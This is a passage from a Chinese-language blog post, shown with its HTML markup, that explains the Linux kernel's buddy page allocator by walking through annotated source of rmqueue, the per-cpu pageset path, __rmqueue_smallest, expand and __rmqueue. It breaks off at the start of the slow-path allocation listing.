class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若由于非CMA的分配上下文导致略过了 pcplist，则order-0 的请求可以到达此处.</span></span><br><span class="line"><span class="comment"> * HIGHATOMIC 区域为更高 order 的原子分配所保留，</span></span><br><span class="line"><span class="comment"> * 故 order-0 的请求应略过它。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// 若 order &gt; 0 且带有 ALLOC_HARDER 标志位，调用 __rmqueue_smallest() 分配</span></span><br><span class="line">        <span class="comment">// 这个标志位意为将水位线减去 1/4，实际上 GFP_ATOMIC 中便会包含该标志位</span></span><br><span class="line"><span class="keyword">if</span> (order &gt; <span class="number">0</span> &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123;</span><br><span class="line">page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line">trace_mm_page_alloc_zone_locked(page, order, migratetype);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 调用 __rmqueue() 进行分配，这个就是真正的核心分配函数了</span></span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line">page = __rmqueue(zone, order, migratetype, alloc_flags);</span><br><span class="line">&#125; <span class="keyword">while</span> (page &amp;&amp; check_new_pages(page, order)); <span class="comment">// 这个检查函数通过了返回false</span></span><br><span class="line">spin_unlock(&amp;zone-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">goto</span> failed;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">  get_pcppage_migratetype(page));</span><br><span class="line"></span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">zone_statistics(preferred_zone, zone);</span><br><span class="line">local_irq_restore(flags);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="comment">/* Separate test+clear to avoid unnecessary atomics */</span></span><br><span class="line"><span class="keyword">if</span> (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;</span><br><span class="line">clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);</span><br><span class="line">wakeup_kswapd(zone, <span class="number">0</span>, <span class="number">0</span>, zone_idx(zone));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line"></span><br><span class="line">failed:</span><br><span class="line">local_irq_restore(flags);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析函数流程前我们先回顾一下这个概念——<code>per-cpu pageset</code> ，这是 zone 上的一个 per-cpu 的页面集，在分配时会优先从这里进行分配</p><p>该函数其实还是对分配的核心逻辑的封装，主要是以下流程：</p><ul><li>分配的 order 为 0，若没有开启 CMA | 设置了 ALLOC_CMA | 迁移类型非 MIGRATE_MOVABLE，则尝试从 per-cpu pageset 中分配并返回</li><li>order &gt; 0，调用 <code>__rmqueue_smallest()</code> 进行页面分配</li><li>之前未分配成功，调用 <code>__rmqueue()</code> 进行页面分配</li><li>结果检查，其中循环内是用 <code>check_new_pages()</code>，未通过则重新循环（回到第二步）</li></ul><h5 id="①-rmqueue-pcplist-：从-per-cpu-pageset-上做-order-0-的分配"><a href="#①-rmqueue-pcplist-：从-per-cpu-pageset-上做-order-0-的分配" class="headerlink" title="① rmqueue_pcplist()：从 per-cpu pageset 上做 order-0 的分配"></a>① rmqueue_pcplist()：从 per-cpu pageset 上做 order-0 的分配</h5><p>主要是关中断→页面分配→开中断三步走，最后分配调用到的是 <code>__rmqueue_pcplist()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Lock and remove page from the per-cpu list */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *<span class="title function_">rmqueue_pcplist</span><span class="params">(<span class="keyword">struct</span> zone *preferred_zone,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> zone *zone, <span class="type">gfp_t</span> gfp_flags,</span></span><br><span class="line"><span class="params"><span class="type">int</span> migratetype, <span class="type">unsigned</span> <span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">local_irq_save(flags); <span class="comment">// 关中断</span></span><br><span class="line">pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;</span><br><span class="line"><span class="built_in">list</span> = &amp;pcp-&gt;lists[migratetype]; <span class="comment">// 获取迁移类型链表</span></span><br><span class="line">page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, <span class="built_in">list</span>); <span class="comment">// 分配</span></span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span>);</span><br><span class="line">zone_statistics(preferred_zone, zone);</span><br><span class="line">&#125;</span><br><span class="line">local_irq_restore(flags); <span class="comment">// 开中断</span></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__rmqueue_pcplist()</code> 主要就是一个大循环，若 pcplist 为空则调用 <code>rmqueue_bulk()</code> 先从 zone 上拿 pages，之后就是简单的链表脱链，分配结果使用 <code>check_new_page()</code> 进行检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 从 per-cpu 链表上取出 page, 调用者必须保护链表 */</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_pcplist</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (list_empty(<span class="built_in">list</span>)) &#123; <span class="comment">// list 是空的</span></span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">pcp-&gt;count += rmqueue_bulk(zone, <span class="number">0</span>,</span><br><span class="line">READ_ONCE(pcp-&gt;batch), <span class="built_in">list</span>,</span><br><span class="line">migratetype, alloc_flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(list_empty(<span class="built_in">list</span>)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 链表脱链</span></span><br><span class="line">page = list_first_entry(<span class="built_in">list</span>, <span class="keyword">struct</span> page, lru);</span><br><span class="line">list_del(&amp;page-&gt;lru);</span><br><span class="line">pcp-&gt;count--;</span><br><span class="line">&#125; <span class="keyword">while</span> (check_new_pcp(page));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>rmqueue_bulk()</code> 则最终会调用到 <code>__rmqueue()</code> 为 pcplist 进行 <code>pcp-&gt;batch</code> 次的 order-0 的页面分配，并建立链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 为了高效率，从 buddy 分配器获得指定数量的元素, </span></span><br><span class="line"><span class="comment"> * 所有的单个元素都在持有锁的情况下进行.  将其添加到提供的链表中.</span></span><br><span class="line"><span class="comment"> * 返回放置在 *list 链表上的 pages 数量.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">rmqueue_bulk</span><span class="params">(<span class="keyword">struct</span> zone *zone, <span class="type">unsigned</span> <span class="type">int</span> order,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> count, <span class="keyword">struct</span> list_head *<span class="built_in">list</span>,</span></span><br><span class="line"><span class="params"><span class="type">int</span> migratetype, <span class="type">unsigned</span> <span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i, alloced = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;zone-&gt;lock);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> __rmqueue(zone, order, migratetype,</span><br><span class="line">alloc_flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(page == <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(check_pcp_refill(page)))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 由 expand() 返回的分割 buddy 页面在此处以物理页框顺序接收。</span></span><br><span class="line"><span class="comment"> * 页面被添加到 caller 的链表尾部。从 caller 的角度看，链表在</span></span><br><span class="line"><span class="comment"> * 某些情况下是按照页码排序的。这对一些可以从头部前向的IO设备是有用的，</span></span><br><span class="line"><span class="comment"> * 因为链表也是在物理页的顺序上的。这对于可以在物理页合理排序的情况下</span></span><br><span class="line"><span class="comment"> * 合并IO请求的IO设备是有用的。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">list_add_tail(&amp;page-&gt;lru, <span class="built_in">list</span>);</span><br><span class="line">alloced++;</span><br><span class="line"><span class="keyword">if</span> (is_migrate_cma(get_pcppage_migratetype(page)))</span><br><span class="line">__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,</span><br><span class="line">      -(<span class="number">1</span> &lt;&lt; order));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * i pages were removed from the buddy list even if some leak due</span></span><br><span class="line"><span class="comment"> * to check_pcp_refill failing so adjust NR_FREE_PAGES based</span></span><br><span class="line"><span class="comment"> * on i. Do not confuse with &#x27;alloced&#x27; which is the number of</span></span><br><span class="line"><span class="comment"> * pages added to the pcp list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));</span><br><span class="line">spin_unlock(&amp;zone-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> alloced;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="②-rmqueue-smallest-：遍历指定-migrationtype-链表的-buddy-算法（核心中的核心）"><a href="#②-rmqueue-smallest-：遍历指定-migrationtype-链表的-buddy-算法（核心中的核心）" class="headerlink" title="② __rmqueue_smallest()：遍历指定 migrationtype 链表的 buddy 算法（核心中的核心）"></a>② __rmqueue_smallest()：遍历指定 migrationtype 链表的 buddy 算法（核心中的核心）</h5><p>我们重新来回顾一下 <code>free_area</code> 的结构，在其中根据迁移类型分成了多个链表：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><p>而一个 zone 是由多个 <code>free_area</code> 组成的，一个 <code>free_area</code> 对应一个 order，那么对于该函数而言其只会遍历特定的 order，那么就成了下面的模型：</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>现在我们可以以来看这个函数了：从待分配 order 所对应的 <code>free_area</code> 的指定的 migration type 链表上分配，若不够则一直向更高 order 进行分配后对半向下拆到低 order，这里向更高 order 分配是通过简单的循环 + 链表脱链操作完成的，而拆高阶 page 的操作则是通过 <code>expand()</code> 完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 对给定的 migrationtype 遍历 free lists </span></span><br><span class="line"><span class="comment"> * 并从 freelists 上移除最小可用的页面</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> __always_inline</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_smallest</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">migratetype</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> current_order;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> *<span class="title">area</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在 preferred list 上寻找一个合适 size 的 page */</span></span><br><span class="line"><span class="keyword">for</span> (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;</span><br><span class="line">area = &amp;(zone-&gt;free_area[current_order]);</span><br><span class="line">page = get_page_from_free_area(area, migratetype);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">del_page_from_free_list(page, zone, current_order);</span><br><span class="line">expand(zone, page, order, current_order, migratetype);</span><br><span class="line">set_pcppage_migratetype(page, migratetype);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>expand()</code> 的逻辑就比较简单，从高阶 order 一直循环到待分配的 order：</p><ul><li>首先高阶 order–，之后页面拆两半，把后半部分挂到链表上，前半部分留到下次循环继续拆</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 此处再分割的顺序对 IO subsystem 而言是十分重要的.</span></span><br><span class="line"><span class="comment"> * 请不要在有好的理由及回归测试前改变这个顺序。</span></span><br><span class="line"><span class="comment"> * 特别地，当大块的内存被分割，更小块（内存）被传递的顺序</span></span><br><span class="line"><span class="comment"> * 则由他们在该函数中被分割的顺序决定。</span></span><br><span class="line"><span class="comment"> * 根据实际测试，这是影响传递给IO子系统的 pages 顺序的主要因素，</span></span><br><span class="line"><span class="comment"> * 考虑到包含一个内存大块（由一系列小的分配作用）的 buddy system 的行为，</span></span><br><span class="line"><span class="comment"> * 这也是合理的。这种行为是 sglist 合并成功的关键因素。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- nyc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">expand</span><span class="params">(<span class="keyword">struct</span> zone *zone, <span class="keyword">struct</span> page *page,</span></span><br><span class="line"><span class="params"><span class="type">int</span> low, <span class="type">int</span> high, <span class="type">int</span> migratetype)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> size = <span class="number">1</span> &lt;&lt; high;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (high &gt; low) &#123;</span><br><span class="line">high--;</span><br><span class="line">size &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 标记为 guard pages (或 page), 这将允许在 buddy 将被</span></span><br><span class="line"><span class="comment"> * 释放时合并回分配器.对应的页表项不会被创建，</span></span><br><span class="line"><span class="comment"> * pages 在 虚拟地址空间上仍将保持不存在。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">add_to_free_list(&amp;page[size], zone, high, migratetype);</span><br><span class="line">set_buddy_order(&amp;page[size], high);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="③-rmqueue-：分配封装函数"><a href="#③-rmqueue-：分配封装函数" class="headerlink" title="③ __rmqueue()：分配封装函数"></a>③ __rmqueue()：分配封装函数</h5><p>这个函数其实主要是对其他分配函数的封装，最终的核心函数其实都还是 <code>__rmqueue_smallest()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 从 buddy allocator 上移除一个元素.</span></span><br><span class="line"><span class="comment"> * 在持有 zone-&gt;lock 时调用.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">rmqueue</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 通过当半数空闲内存在 CMA 区域时从 CMA 中分配</span></span><br><span class="line"><span class="comment"> * 以平衡常规的与CMA区域的可迁移的分配。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;</span><br><span class="line">    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;</span><br><span class="line">    zone_page_state(zone, NR_FREE_PAGES) / <span class="number">2</span>) &#123;</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">page = __rmqueue_smallest(zone, order, migratetype);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA)</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,</span><br><span class="line">alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line">trace_mm_page_alloc_zone_locked(page, order, migratetype);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流程如下：</p><ul><li>若开启了 CMA，比对常规区域与 CMA 区域的空闲页面数量，若 CMA 的多则调用 <code>__rmqueue_cma_fallback()</code> 从 CMA 区域分配（其实就是调用 <code>__rmqueue_smallest()</code> 从迁移类型为 <code>MIGRATE_CMA</code> 的链表上分配），成功则直接返回</li><li>调用 <code>__rmqueue_smallest()</code> 从指定迁移类型链表进行分配，若未成功：<ul><li>若设置了 <code>ALLOC_CMA</code> 的分配 flag，调用 <code>__rmqueue_cma_fallback()</code> 从 CMA 区域进行分配</li><li>若上一步失败则调用 <code>__rmqueue_fallback()</code> 尝试从其他迁移类型链表获取页面，若还是失败则重试这一个大步骤</li></ul></li></ul><h3 id="III-alloc-pages-slowpath-：慢速分配路径"><a href="#III-alloc-pages-slowpath-：慢速分配路径" class="headerlink" title="III. __alloc_pages_slowpath()：慢速分配路径"></a>III. __alloc_pages_slowpath()：慢速分配路径</h3><p>当快速路径的分配不成功时，说明系统当前可能已经没有足够的连续的空闲页面，这时我们就要进入到慢速路径的分配，<strong>进行内存碎片整理与内存回收</strong>，之后再进行分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span 